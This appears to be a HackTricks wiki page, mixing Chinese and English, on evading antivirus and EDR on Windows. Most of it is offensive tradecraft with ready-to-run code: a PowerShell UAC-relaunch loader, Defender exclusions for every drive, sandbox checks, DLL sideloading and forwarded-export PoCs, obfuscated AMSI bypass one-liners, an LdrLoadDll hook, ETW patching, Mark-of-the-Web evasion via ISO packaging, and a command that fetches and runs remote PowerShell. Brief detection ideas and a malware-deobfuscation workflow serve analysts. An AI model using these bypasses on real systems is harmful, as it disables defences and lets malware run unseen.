# 杀毒软件 (AV) 绕过

{{#include ../banners/hacktricks-training.md}}

**此页面由** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## 停止 Defender

- [defendnot](https://github.com/es3n1n/defendnot): 一个用于停止 Windows Defender 正常工作的工具。
- [no-defender](https://github.com/es3n1n/no-defender): 一个通过伪装成另一个 AV 来停止 Windows Defender 工作的工具。
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### 在篡改 Defender 之前的安装程序式 UAC 诱饵

冒充游戏作弊工具的公共 loaders 常以未签名的 Node.js/Nexe 安装程序形式发布，首先会 **请求用户提升权限**，然后才去削弱 Defender。流程很简单：

1. 使用 `net session` 探测是否具有管理员上下文。该命令只有在调用者拥有管理员权限时才会成功，因此失败表示 loader 以标准用户身份运行。
2. 立即使用 `RunAs` verb 重新启动自身，以触发预期的 UAC 同意提示，同时保留原始命令行。
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
受害者通常已经认为他们正在安装 “cracked” 软件，所以提示通常会被接受，从而赋予恶意软件更改 Defender 的策略所需的权限。

### Blanket `MpPreference` exclusions for every drive letter

一旦获得提升权限，GachiLoader-style chains 会最大化 Defender 的盲区，而不是直接禁用该服务。加载器首先结束 GUI 监视进程 (`taskkill /F /IM SecHealthUI.exe`)，然后推送 **极其宽泛的排除项**，使每个用户配置文件、系统目录和可移动磁盘都无法被扫描：
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
关键观察：

- 这个循环会遍历每个已挂载的文件系统 (D:\, E:\, USB sticks 等)，所以 **以后在磁盘任何位置放置的 payload 都会被忽略**。
- `.sys` 扩展名的排除是面向未来的——攻击者保留在以后加载未签名驱动的选项，而无需再次接触 Defender。
- 所有更改都会落在 `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` 下，这使得后续阶段可以确认这些排除项是否保持生效，或在不重新触发 UAC 的情况下扩展它们。

因为没有停止任何 Defender 服务，简单的健康检查会继续报告 “antivirus active”，尽管实时检测从未触及这些路径。

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Static detection 是通过在二进制或脚本中标记已知的恶意字符串或字节数组来实现的，同时还会从文件本身提取信息（例如文件描述、公司名称、数字签名、图标、校验和等）。这意味着使用已知的公共工具更容易被发现，因为它们很可能已经被分析并被标记为恶意。有几种方法可以绕过这种检测：

- **Encryption**

如果你对二进制进行加密，AV 就无法检测到你的程序，但你需要某种 loader 在内存中解密并运行该程序。

- **Obfuscation**

有时你只需更改二进制或脚本中的一些字符串就能通过 AV，但根据你要混淆的内容，这可能是一个耗时的工作。

- **Custom tooling**

如果你开发自己的工具，就不会有已知的恶意签名，但这需要大量时间和精力。

> [!TIP]
> 检查 Windows Defender static detection 的一个好方法是 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上将文件拆分为多个段，然后让 Defender 分别扫描每一段，这样可以准确告诉你二进制中被标记的字符串或字节是什么。

强烈建议你查看这个关于实用 AV Evasion 的 [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)。

### **Dynamic analysis**

Dynamic analysis 是指 AV 在 sandbox 中运行你的二进制并观察恶意行为（例如尝试解密并读取浏览器密码、对 LSASS 进行 minidump 等）。这一部分可能更难对付，但下面是一些可以用来规避 sandbox 的方法。

- **Sleep before execution** 这取决于实现方式，可能是绕过 AV 的 dynamic analysis 的好方法。为了不打断用户工作流，AV 的扫描时间通常很短，因此使用长时间的 sleep 可以干扰二进制的分析。问题是，许多 AV 的 sandbox 可以根据实现方式跳过 sleep。
- **Checking machine's resources** 通常 sandbox 可用的资源很少（例如 < 2GB RAM），否则会拖慢用户的机器。你也可以更有创意，例如检测 CPU 温度甚至风扇转速，不是所有东西都会在 sandbox 中实现。
- **Machine-specific checks** 如果你想针对加入了 "contoso.local" 域的用户工作站，你可以检查计算机的域是否与指定的匹配，如果不匹配，就让程序退出。

事实证明，Microsoft Defender 的 Sandbox 计算机名是 HAL9TH，所以你可以在 payload 爆发之前检查计算机名，如果名称匹配 HAL9TH，则表示你在 defender 的 sandbox 中，可以让程序退出。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

下面是来自 [@mgeeky](https://twitter.com/mariuszbit) 关于对抗 Sandboxes 的一些很好的建议

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

正如我们在这篇文章中之前所说，**public tools** 最终会被 **检测到**，所以你应该问自己一个问题：

例如，如果你想 dump LSASS，**你真的需要使用 mimikatz 吗**？还是可以使用另一个较不知名但也能 dump LSASS 的项目？

正确的答案很可能是后者。以 mimikatz 为例，它可能是 AV 和 EDR 最常标记的恶意软件之一，尽管该项目本身非常出色，但在绕过 AV 时使用它是个噩梦，所以只需为你想实现的目标寻找替代方案即可。

> [!TIP]
> 在修改 payload 以规避检测时，确保在 defender 中**关闭自动样本提交**，并且，请务必**不要将样本上传到 VIRUSTOTAL**，如果你的目标是长期实现规避。如果你想检查某个 AV 是否会检测到你的 payload，可以在 VM 上安装该 AV，尝试关闭自动样本提交，并在那儿进行测试直到满意为止。

## EXEs vs DLLs

在可能的情况下，总是**优先使用 DLL 来规避检测**，根据我的经验，DLL 文件通常**被检测和分析的概率远低于 EXE**，因此这是在某些情况下避免被检测的一个非常简单的技巧（前提是你的 payload 有办法以 DLL 形式运行）。

正如我们在这张图中看到的，来自 Havoc 的 DLL Payload 在 antiscan.me 上的检测率为 4/26，而 EXE payload 的检测率为 7/26。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

现在我们将展示一些可以与 DLL 文件一起使用以提高隐蔽性的技巧。

## DLL Sideloading & Proxying

**DLL Sideloading** 利用 loader 使用的 DLL 搜索顺序，通过将受害应用程序和恶意 payload 放在同一目录下实现。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 和下面的 powershell 脚本来检查哪些程序易受 DLL Sideloading 影响：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
此命令会输出位于 "C:\Program Files\\" 中易受 DLL hijacking 影响的程序列表，以及它们尝试加载的 DLL 文件。

我强烈建议你 **explore DLL Hijackable/Sideloadable programs yourself**，该技术如果正确实施相当隐蔽，但如果使用公开已知的 DLL Sideloadable 程序，可能很容易被发现。

仅仅将一个带有程序期望加载名称的恶意 DLL 放置到目标位置，并不会直接执行你的 payload，因为程序期望该 DLL 中包含特定函数。为了解决这个问题，我们将使用另一种技术，称为 **DLL Proxying/Forwarding**。

**DLL Proxying** 将程序的调用从代理（恶意）DLL 转发到原始 DLL，从而保留程序功能并能够处理执行你的 payload。

我将使用来自 [@flangvik](https://twitter.com/Flangvik/) 的 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目。

这些是我遵循的步骤：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最后一个命令将为我们生成两个文件：一个 DLL 源代码模板，以及重命名后的原始 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
这些是结果：

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（用 [SGN](https://github.com/EgeBalci/sgn) 编码）和 proxy DLL 在 [antiscan.me](https://antiscan.me) 的检测率都是 0/26！我会称之为一次成功。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 我 **强烈建议** 你观看 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading 的内容，以及 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)，以更深入地了解我们讨论的内容。

### 滥用 Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- 如果尚未加载，则加载 `TargetDll`
- 从中解析 `TargetFunc`

关键行为要点：
- 如果 `TargetDll` 是 KnownDLL，则它会从受保护的 KnownDLLs 命名空间提供（例如 ntdll、kernelbase、ole32）。
- 如果 `TargetDll` 不是 KnownDLL，则使用正常的 DLL 搜索顺序，其中包括执行转发解析的模块所在的目录。

这就能实现一种间接的 sideloading primitive：找到一个导出被转发到非-KnownDLL 模块名的已签名 DLL，然后将该已签名 DLL 与一个攻击者控制的、命名恰好为该转发目标模块名的 DLL 放在同一目录。当调用该转发导出时，加载器会解析转发并从同一目录加载你的 DLL，执行你的 DllMain。

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` 不是 KnownDLL，因此按正常搜索顺序解析。

PoC (copy-paste):
1) 将已签名的系统 DLL 复制到可写文件夹
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) 在相同的文件夹中放置一个恶意的 `NCRYPTPROV.dll`。一个最小的 `DllMain` 就足以获得代码执行；你不需要实现转发的函数来触发 `DllMain`。
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) 使用已签名的 LOLBin 触发转发：
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32（已签名）加载并列的 `keyiso.dll`（已签名）
- 在解析 `KeyIsoSetAuditingInterface` 时，加载器会遵循转发到 `NCRYPTPROV.SetAuditingInterface`
- 然后加载器从 `C:\test` 加载 `NCRYPTPROV.dll` 并执行其 `DllMain`
- 如果 `SetAuditingInterface` 未实现，你只有在 `DllMain` 已经运行之后才会收到 “missing API” 错误

Hunting tips:
- 关注目标模块不是 KnownDLL 的转发导出。KnownDLLs 列表位于 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`。
- 你可以使用如下工具枚举转发导出：
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- 查看 Windows 11 forwarder 清单以搜索候选项: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- 监视 LOLBins (e.g., rundll32.exe) 从非系统路径加载已签名的 DLL，随后从该目录加载具有相同基名的非-KnownDLLs
- 对类似以下的进程/模块链发出警报： `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll`（位于用户可写路径下）
- 强制实施代码完整性策略 (WDAC/AppLocker)，并在应用程序目录中禁止 write+execute

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze 是一个 payload toolkit，用于通过 suspended processes、direct syscalls 和 alternative execution methods 绕过 EDRs`

你可以使用 Freeze 以隐蔽的方式加载并执行你的 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 规避只是猫鼠游戏，今天有效的方法明天可能会被检测到，所以不要只依赖单一工具，如果可能，尝试串联多种规避技术。

## AMSI（反恶意软件扫描接口）

AMSI 是为防止 "fileless malware" 而创建的。最初，AVs 只能扫描磁盘上的文件，所以如果你能够以某种方式直接在内存中执行 payloads，AV 就无法阻止，因为它没有足够的可见性。

AMSI 功能集成在 Windows 的这些组件中：

- User Account Control，或 UAC（在 EXE、COM、MSI 或 ActiveX 安装时的提升）
- PowerShell（脚本、交互式使用和动态代码评估）
- Windows Script Host（wscript.exe 和 cscript.exe）
- JavaScript 和 VBScript
- Office VBA macros

它通过以未加密且未混淆的形式暴露脚本内容，使防病毒解决方案能够检查脚本行为。

运行 `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` 会在 Windows Defender 上触发以下警报。

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

注意它如何在前面加上 `amsi:`，然后是脚本运行的可执行文件路径，在本例中为 powershell.exe。

我们没有向磁盘写入任何文件，但仍因 AMSI 在内存中被拦截。

此外，从 **.NET 4.8** 开始，C# 代码也会通过 AMSI 运行。这甚至影响 `Assembly.Load(byte[])` 的内存加载执行。因此，如果想规避 AMSI，建议使用更低版本的 .NET（例如 4.7.2 或更低版本）来进行内存执行。

有几种方法可以绕过 AMSI：

- **Obfuscation**

由于 AMSI 主要依赖静态检测，因此修改你尝试加载的脚本有时是规避检测的好方法。

不过，AMSI 有能力对多层混淆的脚本进行去混淆，因此混淆的效果取决于实现方式，有时并不是一个好的选择。这使得规避并非那么直观。不过，有时候只需更改几个变量名就可以通过检测，这取决于标记的严重程度。

- **AMSI Bypass**

由于 AMSI 是通过将一个 DLL 注入到 powershell（以及 cscript.exe、wscript.exe 等）进程来实现的，即使以非特权用户运行也可以轻易篡改。由于 AMSI 实现上的这个缺陷，研究人员已经发现了多种规避 AMSI 扫描的方法。

**Forcing an Error**

强制 AMSI 初始化失败（amsiInitFailed）将导致当前进程不启动任何扫描。最初这是由 [Matt Graeber](https://twitter.com/mattifestation) 披露的，Microsoft 已经开发了签名来防止其被广泛使用。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
只需要一行 powershell 代码就能使当前 powershell 进程中的 AMSI 无法使用。当然，这一行代码已经被 AMSI 本身 检测到，因此需要进行一些修改才能使用该技术。

下面是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 获取的一个修改过的 AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
请注意，这篇帖子一旦发布很可能会被检测到，因此如果你的目的是不被发现，就不要发布任何代码。

Memory Patching

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获得更详细的说明。

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

实现大纲（x64 C/C++ 伪代码）：
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
说明
- 适用于 PowerShell、WScript/CScript 和 custom loaders（任何会加载 AMSI 的情形）。
- 建议与通过 stdin 提供脚本（`PowerShell.exe -NoProfile -NonInteractive -Command -`）结合使用，以避免长命令行痕迹。
- 观察到被通过 LOLBins 执行的 loaders 使用（例如，`regsvr32` 调用 `DllRegisterServer`）。

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**移除检测到的签名**

可以使用诸如 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 的工具，从当前进程的内存中移除检测到的 AMSI 签名。 这些工具通过扫描当前进程内存中的 AMSI 签名，然后用 NOP 指令覆盖它，从而有效地将其从内存中移除。

**使用 AMSI 的 AV/EDR 产品**

可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 找到使用 AMSI 的 AV/EDR 产品列表。

**使用 PowerShell 版本 2**

如果使用 PowerShell 版本 2，AMSI 将不会被加载，因此可以在不被 AMSI 扫描的情况下运行脚本。你可以这样做：
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging 是一个功能，允许你记录在系统上执行的所有 PowerShell 命令。对于审计和故障排查很有用，但对于想要规避检测的攻击者来说，也可能是一个问题——**会增加被发现的风险**。

要绕过 PowerShell logging，可以使用以下技巧：

- **Disable PowerShell Transcription and Module Logging**：可以使用像 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 这样的工具来实现。
- **Use Powershell version 2**：如果使用 PowerShell 版本 2，AMSI 不会被加载，因此你可以运行脚本而不被 AMSI 扫描。可以这样运行：`powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**：使用 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 来生成一个不带防护的 powershell（这就是 Cobal Strike 中 `powerpick` 使用的方式）。

## Obfuscation

> [!TIP]
> 一些混淆技术依赖于对数据进行加密，这会增加二进制文件的熵，从而更容易被 AVs 和 EDRs 检测到。对此要小心，或许只对代码中敏感或需要隐藏的特定部分应用加密。

### Deobfuscating ConfuserEx-Protected .NET Binaries

在分析使用 ConfuserEx 2（或其商业分支）的恶意软件时，常会遇到多层保护，阻止反编译器和 sandboxes 的分析。下面的工作流程可可靠地**恢复接近原始的 IL**，之后可以在 dnSpy 或 ILSpy 等工具中反编译为 C#。

1.  Anti-tampering removal – ConfuserEx 会对每个 *method body* 进行加密，并在 *module* 的静态构造函数 (`<Module>.cctor`) 中解密。它还会修补 PE checksum，因此任何修改都会导致二进制崩溃。使用 **AntiTamperKiller** 定位被加密的元数据表，恢复 XOR keys 并重写为干净的 assembly：
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
输出包含 6 个 anti-tamper 参数（`key0-key3`, `nameHash`, `internKey`），在构建自定义 unpacker 时会很有用。

2.  Symbol / control-flow recovery – 将 *clean* 文件传给 **de4dot-cex**（一个支持 ConfuserEx 的 de4dot 分支）。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – 选择 ConfuserEx 2 profile  
• de4dot 会撤销 control-flow flattening，恢复原始的命名空间、类和变量名并解密常量字符串。

3.  Proxy-call stripping – ConfuserEx 用轻量级包装器（即 *proxy calls*）替换直接的方法调用，以进一步破坏反编译。使用 **ProxyCall-Remover** 将其移除：
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
完成此步骤后，你应该会看到正常的 .NET API（例如 `Convert.FromBase64String` 或 `AES.Create()`）而不是不透明的包装函数（如 `Class8.smethod_10` 等）。

4.  Manual clean-up – 在 dnSpy 中运行结果二进制，搜索大型的 Base64 blob 或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用位置，以定位真实的 payload。恶意软件通常将其作为 TLV 编码的字节数组初始化在 `<Module>.byte_0` 中。

上述链条可以在不运行恶意样本的情况下恢复执行流程——在离线工作站上工作时非常有用。

> 🛈  ConfuserEx 会生成一个名为 `ConfusedByAttribute` 的自定义属性，可用作 IOC 来自动对样本进行初步分类。

#### 单行命令
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目的目标是提供一个开源的 [LLVM](http://www.llvm.org/) 编译套件分支，通过增强的 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改来提高软件安全性。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示如何使用 `C++11/14` 在编译时生成混淆代码，而无需使用任何外部工具或修改编译器。
- [**obfy**](https://github.com/fritzone/obfy): 通过 C++ 模板元编程框架生成一层混淆操作，使试图破解应用程序的人的工作变得更困难。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 二进制混淆器，能够混淆多种不同的 pe 文件，包括：.exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame 是一个用于任意可执行文件的简单 metamorphic code engine。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个针对 LLVM 支持语言的细粒度 code obfuscation 框架，使用 ROP (return-oriented programming)。ROPfuscator 通过将常规指令转换为 ROP 链，在汇编层面混淆程序，从而破坏对正常控制流的直观理解。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能够将现有的 EXE/DLL 转换为 shellcode 并加载它们

## SmartScreen 与 MoTW

当你从互联网上下载某些可执行文件并运行时，可能见过这个提示界面。

Microsoft Defender SmartScreen 是一种旨在保护最终用户免于运行潜在恶意应用程序的安全机制。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要基于声誉机制工作，这意味着不常见的下载应用会触发 SmartScreen，从而提醒并阻止最终用户执行该文件（尽管仍可通过点击 More Info -> Run anyway 来执行该文件）。

**MoTW** (Mark of The Web) 是一个名为 Zone.Identifier 的 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)，在从互联网上下载文件时会自动创建该 ADS，并记录下载来源的 URL。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>检查从互联网上下载的文件的 Zone.Identifier ADS。</p></figcaption></figure>

> [!TIP]
> 重要的是要注意，用受 **trusted** 的签名证书签名的可执行文件 **won't trigger SmartScreen**。

一种防止你的 payload 获取 Mark of The Web 的非常有效的方法是将其打包到某种容器中，例如 ISO。之所以有效，是因为 Mark-of-the-Web (MOTW) **cannot** 应用于 **non NTFS** 卷。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将 payload 打包到输出容器以规避 Mark-of-the-Web 的工具。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中一个强大的日志记录机制，允许应用程序和系统组件**记录事件（log events）**。然而，它也可以被安全产品用来监控并检测恶意活动。

类似于 AMSI 被禁用（绕过）的方式，也可以让用户空间进程的 **`EtwEventWrite`** 函数立即返回而不记录任何事件。这是通过在内存中修补该函数使其立即返回来实现的，从而有效地禁用了该进程的 ETW 日志记录。

你可以在 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** 找到更多信息。


## C# Assembly Reflection

将 C# 二进制文件加载到内存中已经存在相当长时间，这仍然是运行 post-exploitation 工具而不被 AV 发现的一个非常好的方式。

由于 payload 会直接加载到内存而不触及磁盘，我们只需要担心为整个进程修补 AMSI。

大多数 C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) 已经提供了直接在内存中执行 C# assemblies 的能力，但实现方式有所不同：

- **Fork\&Run**

它涉及**生成一个新的牺牲性进程（spawning a new sacrificial process）**，将你的 post-exploitation 恶意代码注入到该新进程中，执行恶意代码，完成后终止该新进程。此方法有利有弊。Fork and run 方法的优点是执行发生在我们的 Beacon implant 进程**外部（outside）**。这意味着如果我们的 post-exploitation 操作出现问题或被发现，**我们的 implant 存活（implant surviving）** 的机会会大得多。缺点是你被 **行为检测（Behavioural Detections）** 发现的概率也更高。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

这种方式是将 post-exploitation 恶意代码**注入到自身进程（into its own process）**。这样可以避免创建新进程并被 AV 扫描，但缺点是如果 payload 执行出错，你更有可能**丢失你的 beacon**，因为它可能会导致进程崩溃。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果你想阅读更多关于 C# Assembly 加载的内容，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

你也可以**从 PowerShell 加载 C# Assemblies（from PowerShell）**，请查看 [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 S3cur3th1sSh1t 的视频 (https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## Using Other Programming Languages

正如在 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 中提出的，通过让受害机访问部署在 Attacker Controlled SMB share 上的解释器环境，可以使用其他语言来执行恶意代码。

通过允许对 SMB 共享上的 Interpreter Binaries 和环境的访问，你可以在被入侵机器的内存中**执行这些语言的任意代码**。

